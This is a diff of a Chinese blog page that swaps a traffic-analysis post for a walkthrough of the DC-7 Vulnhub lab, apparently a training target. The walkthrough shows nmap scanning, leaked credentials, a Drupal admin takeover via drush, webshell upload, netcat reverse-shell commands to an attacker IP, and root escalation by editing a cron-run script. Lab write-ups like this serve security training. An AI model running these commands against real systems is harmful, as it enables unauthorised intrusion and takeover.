@@ -16,29 +16,39 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="流量分析​													 1.日志分析日志文件扩展名“.log”，通常日志文件较大，审计时常常使用http Logs Viewer工具进行分析。 2.流量分析真实环境中，除了日志分析就是流量分析，经常作为溯源，取证的重要手段。 五层协议 数据链路层： wireshark抓包是使用的链路层协议，直接获取的数据也就是数据链路层的数据帧   常用过滤语法 常用过滤语法 协议过滤 直接在抓包过">
+    <meta name="description" content="DC-7靶机渗透1.信息搜集用nmap对C段进行扫描，命令：nmap -sV  192.168.0.1&#x2F;24 扫描到dc-7目标靶机ip为192.168.0.106且开放80和22端口  访问目标80端口,利用插件查看目标为Drupal8框架，主页面提示爆破不会成功，需要做的就是“跳出”框框思考。搜索DC7USER发现是git源码泄露。  在配置文件中找到了用户名和密码 12$用户名&#x3D;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="流量分析">
-<meta property="og:url" content="http://example.com/2022/06/06/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html">
+<meta property="og:title" content="DC-2靶机渗透">
+<meta property="og:url" content="http://example.com/2023/05/31/DC-7%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/index.html">
 <meta property="og:site_name" content="TTblog">
-<meta property="og:description" content="流量分析​													 1.日志分析日志文件扩展名“.log”，通常日志文件较大，审计时常常使用http Logs Viewer工具进行分析。 2.流量分析真实环境中，除了日志分析就是流量分析，经常作为溯源，取证的重要手段。 五层协议 数据链路层： wireshark抓包是使用的链路层协议，直接获取的数据也就是数据链路层的数据帧   常用过滤语法 常用过滤语法 协议过滤 直接在抓包过">
+<meta property="og:description" content="DC-7靶机渗透1.信息搜集用nmap对C段进行扫描，命令：nmap -sV  192.168.0.1&#x2F;24 扫描到dc-7目标靶机ip为192.168.0.106且开放80和22端口  访问目标80端口,利用插件查看目标为Drupal8框架，主页面提示爆破不会成功，需要做的就是“跳出”框框思考。搜索DC7USER发现是git源码泄露。  在配置文件中找到了用户名和密码 12$用户名&#x3D;">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111033677.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111033029.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111033600.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111033499.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111034378.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111033789.png">
-<meta property="article:published_time" content="2022-06-06T03:22:34.000Z">
-<meta property="article:modified_time" content="2023-04-11T02:36:53.726Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305310927657.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305310941138.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305310928195.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305310958489.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311001338.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311003333.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311008960.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311011091.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311025907.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311031226.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311031676.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311034968.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311037898.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311049432.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311055473.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311058168.png">
+<meta property="article:published_time" content="2023-05-31T03:22:34.000Z">
+<meta property="article:modified_time" content="2023-05-31T03:33:52.713Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="web">
+<meta property="article:tag" content="渗透测试">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111033677.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305310927657.png">
   
   
   
-  <title>流量分析 - TTblog</title>
+  <title>DC-2靶机渗透 - TTblog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -219,7 +229,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="流量分析"></span>
+            <span id="subtitle" data-typed-text="DC-2靶机渗透"></span>
           
         </div>
 
@@ -230,8 +240,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-06-06 11:22" pubdate>
-          June 6, 2022 am
+        <time datetime="2023-05-31 11:22" pubdate>
+          May 31, 2023 am
         </time>
       </span>
     
@@ -242,7 +252,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          461 words
+          1.3k words
         
       </span>
     
@@ -253,7 +263,7 @@
         
         
         
-          4 mins
+          11 mins
         
       </span>
     
@@ -291,38 +301,54 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">流量分析</h1>
+            <h1 style="display: none">DC-2靶机渗透</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><p>​													</p>
-<h2 id="1-日志分析"><a href="#1-日志分析" class="headerlink" title="1.日志分析"></a>1.日志分析</h2><p>日志文件扩展名“.log”，通常日志文件较大，审计时常常使用http Logs Viewer工具进行分析。</p>
-<h2 id="2-流量分析"><a href="#2-流量分析" class="headerlink" title="2.流量分析"></a>2.流量分析</h2><p>真实环境中，除了日志分析就是流量分析，经常作为溯源，取证的重要手段。</p>
-<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111033677.png" srcset="/img/loading.gif" lazyload alt="img">五层协议</p>
-<p><strong>数据链路层</strong>：</p>
-<p>wireshark抓包是使用的链路层协议，直接获取的数据也就<em>是数据链路层的数据</em>帧</p>
-<p>  常用过滤语法</p>
-<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111033029.png" srcset="/img/loading.gif" lazyload alt="img">常用过滤语法</p>
-<p>协议过滤</p>
-<p>直接在抓包过滤框中直接输入协议名即可例如：</p>
-<p>TCP，只显示TCP协议的数据包列表</p>
-<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111033600.png" srcset="/img/loading.gif" lazyload alt="img">tcp</p>
-<p>HTTP，只查看HTTP协议的数据包列表</p>
-<p>Flags字段中SYN, FIN, ACK, PSH, RST, URG</p>
-<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111033499.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>SYN表示建立连接</p>
-<p>FIN表示关闭连接</p>
-<p>ACK表示响应</p>
-<p>PSH表示有DATA数据传输</p>
-<p>RST表示连接重置</p>
-<h2 id="3-流量分析题的技巧"><a href="#3-流量分析题的技巧" class="headerlink" title="3.流量分析题的技巧"></a>3.流量分析题的技巧</h2><h3 id="1-审计应用"><a href="#1-审计应用" class="headerlink" title="1.审计应用"></a>1.审计应用</h3><p>（1）看到一个IP多个端口请求，或者多个IP的一个或多个相同端口请求，可以判断为端口扫描。</p>
-<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111034378.png" srcset="/img/loading.gif" lazyload alt="img">扫描</p>
-<p>（2）当过滤http时，看到大量SQL，可以判断为sql注入，当看到大量404 not fount，可以判断为目录扫描。</p>
-<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111033789.png" srcset="/img/loading.gif" lazyload alt="img">SQL注入</p>
-<h2 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h2><p>1.直接搜索类</p>
-<p>2.USB流量类</p>
-<p>3.TLS加密类</p>
+                <h1 id="DC-7靶机渗透"><a href="#DC-7靶机渗透" class="headerlink" title="DC-7靶机渗透"></a>DC-7靶机渗透</h1><h2 id="1-信息搜集"><a href="#1-信息搜集" class="headerlink" title="1.信息搜集"></a>1.信息搜集</h2><p>用nmap对C段进行扫描，命令：nmap -sV  192.168.0.1&#x2F;24</p>
+<p>扫描到dc-7目标靶机ip为192.168.0.106且开放80和22端口</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305310927657.png" srcset="/img/loading.gif" lazyload alt="image-20230531091934423"></p>
+<p>访问目标80端口,利用插件查看目标为Drupal8框架，主页面提示爆破不会成功，需要做的就是“跳出”框框思考。搜索DC7USER发现是git源码泄露。<img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305310941138.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305310928195.png" srcset="/img/loading.gif" lazyload alt="image-20230531092251586"></p>
+<p>在配置文件中找到了用户名和密码</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$用</span>户名= <span class="hljs-string">&quot; dc7user &quot;</span>;<br><span class="hljs-variable">$密</span>码=“ <span class="hljs-title class_">MdR3xOgB7</span><span class="hljs-comment">#dW ”；</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305310958489.png" srcset="/img/loading.gif" lazyload alt="image-20230531095822425"></p>
+<p>直接拿密码登录，发现密码错误</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311001338.png" srcset="/img/loading.gif" lazyload alt="image-20230531100138277"></p>
+<h2 id="2-ssh口令利用"><a href="#2-ssh口令利用" class="headerlink" title="2.ssh口令利用"></a>2.ssh口令利用</h2><p>尝试利用ssh登录，可以成功登录。</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311003333.png" srcset="/img/loading.gif" lazyload alt="image-20230531100301289"></p>
+<p>首先whoami，并查看当前目录下的文件，发现存在backups，mbox，进入backups发现存在website.sql.gpg  website.tar.gz.gpg这样的文件，百度了解到gpg格式的是加密文件 ，且加密后文件内容都是乱码。这应该对我们就是没什么用的了，那就先查看mbox文件的内容</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311008960.png" srcset="/img/loading.gif" lazyload alt="image-20230531100853921"></p>
+<p>mbox</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311011091.png" srcset="/img/loading.gif" lazyload alt="image-20230531101112045"></p>
+<h2 id="3-drush创建用户"><a href="#3-drush创建用户" class="headerlink" title="3.drush创建用户"></a>3.drush创建用户</h2><p>发现backups.sh是root执行的脚本，且发现里面执行了drush命令。</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311025907.png" srcset="/img/loading.gif" lazyload alt="image-20230531102551869"></p>
+<p>drush是一个shell接口，用于从云服务器命令行管理Drupal。</p>
+<p>需要在 drupal web目录执行（&#x2F;var&#x2F;www&#x2F;[drupal_folder_name]）</p>
+<p>使用 drup 更改密码运行命令（drush user-password admin –password&#x3D;”new_pass”）</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">drush <span class="hljs-keyword">user</span>-<span class="hljs-keyword">password</span> <span class="hljs-keyword">admin</span> <span class="hljs-comment">--password=&quot;123456&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311031226.png" srcset="/img/loading.gif" lazyload alt="image-20230531103106180"></p>
+<h2 id="4-写马"><a href="#4-写马" class="headerlink" title="4.写马"></a>4.写马</h2><p>登录后台，在Content—&gt;Add content–&gt;Basic page下可以添加页面，但是发现不支持php,需要安装插件，将php模块（<a target="_blank" rel="noopener" href="https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz%EF%BC%89%E5%AF%BC%E5%85%A5%EF%BC%88%E5%AF%BC%E5%85%A5%E8%B7%AF%E5%BE%84extend%E2%80%94%3E+Install">https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz）导入（导入路径extend—&gt;+Install</a> new module），导入成功后在extend中添加模块。<img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311031676.png" srcset="/img/loading.gif" lazyload alt="image-20230531103129601"></p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311034968.png" srcset="/img/loading.gif" lazyload alt="image-20230531103411894"></p>
+<p>安装php扩展</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311037898.png" srcset="/img/loading.gif" lazyload alt="image-20230531103715823"></p>
+<p>写入一句话木马，用蚁剑连接</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311049432.png" srcset="/img/loading.gif" lazyload alt="image-20230531104952362"></p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311055473.png" srcset="/img/loading.gif" lazyload alt="image-20230531105559423"></p>
+<h2 id="5-反弹shell"><a href="#5-反弹shell" class="headerlink" title="5.反弹shell"></a>5.反弹shell</h2><p>在&#x2F;opt&#x2F;scripts目录下的backups.sh脚本文件所属组是www-data，所以www-data用户可以对这个脚本文件进行操作，并且这个脚本文件定时执行可以利用它来反弹shell </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">6666</span>  （kali中执行）<br><span class="hljs-attribute">nc</span> -e /bin/bash <span class="hljs-number">192.168.0.105</span> <span class="hljs-number">6666</span> （蚁剑终端执行）<br><span class="hljs-attribute">python</span> -c &#x27;import pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27; （进入交互式界面）<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311058168.png" srcset="/img/loading.gif" lazyload alt="image-20230531105842119"></p>
+<h2 id="6-root提权"><a href="#6-root提权" class="headerlink" title="6.root提权"></a>6.root提权</h2><p>提权，写入反弹shell到backups.sh中，拿到root权限</p>
+<p>写入反弹shell代码到backups.sh脚本文件，并在kali监听7777端口，稍等片刻后，成功getshell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cobol">echo nc -e 192.168.0.105 6666 /bin/bash &gt;&gt; backups.sh<br>nc -lvp 6666（kali）<br></code></pre></td></tr></table></figure>
+
+
 
                 
               </div>
@@ -341,7 +367,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" class="category-chain-item">流量分析</a>
+  <a href="/categories/vulnhub/" class="category-chain-item">vulnhub</a>
   
   
 
@@ -356,7 +382,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/web/">#web</a>
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">#渗透测试</a>
       
     </div>
   
@@ -368,8 +394,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>流量分析</div>
-      <div>http://example.com/2022/06/06/流量分析/</div>
+      <div>DC-2靶机渗透</div>
+      <div>http://example.com/2023/05/31/DC-7靶机渗透/</div>
     </div>
     <div class="license-meta">
       
@@ -381,7 +407,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>June 6, 2022</div>
+          <div>May 31, 2023</div>
         </div>
       
       
@@ -413,18 +439,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/02/10/%E5%88%B0%E5%BA%95%E7%BB%99%E4%B8%8D%E7%BB%99flag%E5%91%A2/" title="到底给不给flag呢">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">到底给不给flag呢</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/05/07/DC-2%E9%9D%B6%E5%9C%BA%E6%90%AD%E6%B8%97%E9%80%8F/" title="DC-2靶场渗透">
-                        <span class="hidden-mobile">DC-2靶场渗透</span>
+                      <a href="/2023/05/30/NMap%20%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/" title="NMap使用技巧总结">
+                        <span class="hidden-mobile">NMap使用技巧总结</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
